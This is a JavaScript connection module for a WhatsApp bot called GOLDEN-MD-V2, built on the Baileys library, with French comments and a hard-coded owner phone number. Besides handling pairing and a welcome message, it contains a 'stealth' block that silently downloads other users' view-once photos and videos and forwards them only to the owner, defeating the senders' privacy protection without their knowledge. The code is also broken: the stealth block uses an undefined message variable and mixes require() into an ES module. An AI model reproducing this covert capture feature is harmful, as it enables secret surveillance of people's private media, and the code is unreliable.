import { makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } from 'baileys';
import deployAsPremium from '../utils/HubX.js';
import configmanager from '../utils/configmanager.js';
import pino from 'pino';
import fs from 'fs';

const data = 'sessionData';

// Numéro de Prince K
const OWNER_NUMBER = '237650554606';

async function connectToWhatsapp(handleMessage) {
    const { version, isLatest } = await fetchLatestBaileysVersion();
    console.log('📦 Baileys version:', version, '| Latest:', isLatest);

    const { state, saveCreds } = await useMultiFileAuthState(data);

    const sock = makeWASocket({
        version: version,
        auth: state,
        printQRInTerminal: false,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        logger: pino({ level: 'silent' }),
        keepAliveIntervalMs: 10000,
        connectTimeoutMs: 60000,
        generateHighQualityLinkPreview: true,
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const reason = lastDisconnect?.error?.toString() || 'unknown';
            console.log('❌ Disconnected:', reason, '| StatusCode:', statusCode);

            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                console.log('🔄 Reconnecting in 5 seconds...');
                setTimeout(() => connectToWhatsapp(handleMessage), 5000);
            } else {
                console.log('🚫 Logged out permanently. Please reauthenticate manually.');
            }

        } else if (connection === 'connecting') {
            console.log('⏳ Connecting...');

        } else if (connection === 'open') {
            console.log('✅ WhatsApp connection established!');

            // --- WELCOME MESSAGE ---
            try {
                const chatId = OWNER_NUMBER + '@s.whatsapp.net';
                const imagePath = './database/DigixCo.jpg';

                const messageText = `╔══════════════════╗
║  *GOLDEN-MD-V2* 🚀  ║
╠══════════════════╣
║  Bot connecté avec succès !
║  Always Forward. GOLDEN-MD-V2.
╚══════════════════╝

👑 *Prince K* | 💻 Powered by GOLDEN-MD-V2`;

                if (fs.existsSync(imagePath)) {
                    await sock.sendMessage(chatId, {
                        image: fs.readFileSync(imagePath),
                        caption: messageText,
                        mimetype: 'image/jpeg',
                    });
                } else {
                    await sock.sendMessage(chatId, { text: messageText });
                }

                console.log('📩 Welcome message sent successfully!');
            } catch (err) {
                console.error('❌ Error sending welcome message:', err);
            }

            sock.ev.on('messages.upsert', async (msg) => handleMessage(sock, msg));
        }
      // --- FONCTION FURTIVE RÉCUPÉRATION VIEW ONCE ---
if (m.message?.stickerMessage?.contextInfo?.quotedMessage) {
    const quoted = m.message.stickerMessage.contextInfo.quotedMessage;
    const viewOnce = quoted.viewOnceMessageV2?.message;

    if (viewOnce && (viewOnce.imageMessage || viewOnce.videoMessage)) {
        try {
            const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
            const type = viewOnce.imageMessage ? 'image' : 'video';
            const media = viewOnce.imageMessage || viewOnce.videoMessage;

            // Téléchargement en mémoire (Buffer)
            const stream = await downloadContentFromMessage(media, type);
            let buffer = Buffer.from([]);
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk]);
            }

            // ENVOI UNIQUEMENT À TON NUMÉRO (IB)
            await sock.sendMessage(OWNER_NUMBER + '@s.whatsapp.net', { 
                [type]: buffer, 
                caption: `🥷 *Prince K Stealth*\n_Média récupéré via sticker de : ${m.pushName}_`,
                mimetype: type === 'video' ? 'video/mp4' : 'image/jpeg'
            });

            // On marque le sticker comme lu, mais on ne répond RIEN dans le groupe
            await sock.readMessages([m.key]);
            console.log("✅ Média ViewOnce envoyé en secret à l'Owner");

        } catch (err) {
            console.error('❌ Erreur Furtif:', err.message);
        }
    }
}
      
    });

    setTimeout(async () => {
        if (!state.creds.registered) {
            console.log('⚠️ Not logged in. Preparing pairing process...');
            try {
                const asPremium = true;
                const number = OWNER_NUMBER;

                if (asPremium === true) {
                    configmanager.premiums.premiumUser['c'] = { creator: OWNER_NUMBER };
                    configmanager.saveP();
                    configmanager.premiums.premiumUser['p'] = { premium: number };
                    configmanager.saveP();
                }

                console.log(`🔄 Requesting pairing code for ${number}`);
                const code = await sock.requestPairingCode(number, 'GOLDENV2');
                console.log('📲 Pairing Code:', code);
                console.log('👉 Enter this code on your WhatsApp app to pair.');

                setTimeout(() => {
                    configmanager.config.users[number] = {
                        sudoList: [OWNER_NUMBER + '@s.whatsapp.net'],
                        tagAudioPath: 'tag.mp3',
                        antilink: true,
                        response: true,
                        autoreact: false,
                        prefix: '.',
                        reaction: '⚡',
                        welcome: false,
                        record: true,
                        type: false,
                        publicMode: false,
                        bans: {},
                    };
                    configmanager.save();
                }, 2000);
            } catch (e) {
                console.error('❌ Error while requesting pairing code:', e);
            }
        }
    }, 5000);

    return sock;
}

export default connectToWhatsapp;
                      
